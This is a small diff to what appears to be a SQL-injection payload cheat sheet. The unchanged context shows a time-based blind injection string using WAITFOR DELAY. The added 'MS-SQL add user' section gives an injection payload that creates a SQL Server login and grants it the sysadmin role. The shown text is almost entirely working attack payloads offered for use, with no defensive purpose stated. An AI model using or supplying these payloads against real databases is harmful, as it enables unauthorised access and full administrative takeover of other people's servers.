@@ -18,3 +18,9 @@ hex(1)
 ```
 asdf'; WAITFOR DELAY '0:0:10'--
 ```
+
+### MS-SQL add user
+```
+EXEC sp_addlogin 'quang', 'pass'; 
+exec sys.sp_addsrvrolemember @loginame=N'quang', @rolename = N'sysadmin' ;-- -
+```
